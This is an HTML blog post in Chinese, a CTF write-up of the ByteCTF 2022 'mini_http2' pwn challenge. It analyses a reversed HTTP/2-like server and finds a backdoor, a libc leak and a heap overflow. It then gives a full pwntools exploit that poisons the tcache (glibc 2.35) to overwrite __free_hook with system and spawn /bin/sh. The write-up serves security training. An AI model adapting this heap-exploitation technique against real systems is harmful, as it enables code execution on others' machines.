@@ -1,0 +1,329 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ByteCTF2022-PWN-复现 | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="ByteCTF2022-PWN-复现 | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="
+今年bytectf没来得及去打，但是题目质量是很高的，现在重新做一下当时的题
+
+PWN
+mini_http2
+分析
+libc的版本是2.35，但是main函数的开头将__free_hook的地址存到了bss段上，有点东西。
+
+交叉引用看了..." />
+    <meta name="keywords" content="WP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              ByteCTF2022-PWN-复现
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-11-19
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/0eC34PvND/" class="post-tag">
+                  # WP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>今年bytectf没来得及去打，但是题目质量是很高的，现在重新做一下当时的题</p>
+</blockquote>
+<h1 id="pwn">PWN</h1>
+<h2 id="mini_http2">mini_http2</h2>
+<h3 id="分析">分析</h3>
+<p>libc的版本是2.35，但是main函数的开头将<code>__free_hook</code>的地址存到了bss段上，有点东西。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/c8a1fa409c0b9.png" alt="1668849923953.png" loading="lazy"></figure>
+<p>交叉引用看了下，果然存在后门，如果将<code>system</code>的地址写入<code>__free_hook</code>中，就能执行<code>system(s1);</code></p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/178b1853c7e1a.png" alt="1668850053122.png" loading="lazy"></figure>
+<p>继续逆。发现在注册功能中，<code>s1</code>直接就是get传参传进来的<code>username</code>的值。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/0f4fa84f953bb.png" alt="1668850217566.png" loading="lazy"></figure>
+<p>登录功能也直接白给了libc上的地址，</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/d7d4512850bdb.png" alt="1668850305271.png" loading="lazy"></figure>
+<p>比较要命的地方来了。post和get传参逆的时候其实都还不算累，但是审管理堆块的功能时，发现他对表达式的解析有一点诡异（可能只是我之前没见过，熟练的师傅都一眼顶针了）</p>
+<p><code>sub_2EB9</code>函数中对postdata的解析极其复杂，以至于我逆了相当长一段时间。然后发现，这不就是json的格式吗（捂脸哭）</p>
+<p>下面来看一下用得上的功能：</p>
+<ul>
+<li><strong>add_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/f53effa8b1b64.png" alt="1668850636058.png" loading="lazy"></figure>
+<p>使用的是<code>strdup</code>来调用<code>malloc</code>创建堆块，大小控制在0x110以内，数量最多16个，创建完成过后会白给堆上的指针。</p>
+<ul>
+<li><strong>del_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/4d25c557be4f5.png" alt="1668850849248.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/ae0d8edc87c52.png" alt="1668850889535.png" loading="lazy"></figure>
+<p>删除功能中不存在直接的uaf</p>
+<ul>
+<li><strong>edit_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/19/b57f6c9ceb4ff.png" alt="1668850969805.png" loading="lazy"></figure>
+<p>问题主要就出在这个功能中，直接使用<code>memcpy</code>将传入的数据拷贝到指定堆块中去，并没有和创建时的大小进行比较。所以是存在堆溢出的，但是由于判断长度使用的是<code>strlen</code>，所以payload会被<code>\x00</code>截断。</p>
+<p>接下来就是构造堆溢出，劫持tcache bin的链表，整个过程并不复杂，但由于该题在处理协议的时候使用了大量的<code>malloc</code>和<code>free</code>，所以堆布局相对来说十分混乱，需要注意一下。且版本是2.35，在tcache bin和fastbin的单链表中都有宏去保护指针，需要处理一下。</p>
+<p>（逆协议的过程就省去了，有不理解的地方的话可以参考exp来理解，或者直接联系我）</p>
+<h3 id="exp">exp</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+
+p = process('./mini_http2')
+elf = ELF('./mini_http2')
+libc = elf.libc
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p)
+	raw_input()
+
+def get(url):
+	pay = b'\x00' + p16(len(url)+7)[::-1] + b'\x01\x05'
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	pay = b'\x82\x86\x44' + p32(len(url))[::-1]
+	pay += url
+	p.send(pay)
+
+def post(url, postdata):
+	pay = b'\x00' + p16(len(url)+7)[::-1] + b'\x01\x05'
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	pay = b'\x83\x86\x44' + p32(len(url))[::-1]
+	pay += url
+	p.send(pay)
+	pay = b'\x00' + p16(len(postdata))[::-1]
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	p.send(postdata)
+
+def add_worker(name, desc):
+	pay = b'{&quot;name&quot;: &quot;' + name + b'&quot;, '
+	pay += b'&quot;desc&quot;: &quot;' + desc + b'&quot;}'
+	post(b'/api/add_worker', pay)
+
+def del_worker(idx):
+	pay = b'{&quot;worker_idx&quot;: ' + idx + b' }'
+	post(b'/api/del_worker', pay)
+
+def edit_worker(name, desc, idx):
+	pay = b'{&quot;name&quot;: &quot;' + name + b'&quot;, '
+	pay += b'&quot;desc&quot;: &quot;' + desc + b'&quot;,'
+	pay += b'&quot;worker_idx&quot;: ' + idx + b' }'
+	post(b'/api/edit_worker', pay)
+
+get(b'/register?username=/bin/sh&amp;password=kotori')
+get(b'/login?username=/bin/sh&amp;password=kotori')
+
+ru('\'gift\': &quot;0x')
+libcbase = int(ru('}')[:-2], 16) - 0xc4200
+# print(hex(libcbase))
+hook = libcbase + libc.symbols['__free_hook']
+system = libcbase + libc.symbols['system']
+
+add_worker(b'1'*0x80, b'2'*0x80) # 0
+ru('name_addr&quot;: &quot;0x')
+heapbase = int(ru('&quot;')[:-1], 16) - 0x800
+# print(hex(heapbase))
+
+add_worker(b'3'*0x80, b'4'*0x80) # 1
+add_worker(b'5'*0x80, b'6'*0x80) # 2
+del_worker(b'1')
+del_worker(b'2')
+
+add_worker(b'7'*0x80, b'8'*0x8) # 1
+add_worker(b'9'*0x80, b'a'*0x8) # 2
+add_worker(b'b'*0x80, b'c'*0x8) # 3
+add_worker(b'd'*0x80, b'e'*0x8) # 4
+del_worker(b'2')
+del_worker(b'4')
+
+pay = b'a'*0x90 + p64(((heapbase+0xa00)&gt;&gt;12)^(hook-0x78))[:6]
+edit_worker(pay, b'kotori', b'3')
+
+add_worker(b'9'*0x80, b'a'*0x8) # 2
+pay = b'a'*0x78 + p64(system)[:6]
+add_worker(pay, b'a'*0x8) # 4
+
+get(b'/exit')
+
+# g()
+
+p.interactive()
+</code></pre>
+<p>（待续）</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#pwn">PWN</a>
+<ul>
+<li><a href="#mini_http2">mini_http2</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/2022四川省赛/">
+              <h3 class="post-title">
+                2022年&#34;深信服&#34;杯-四川省赛-PWN-WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
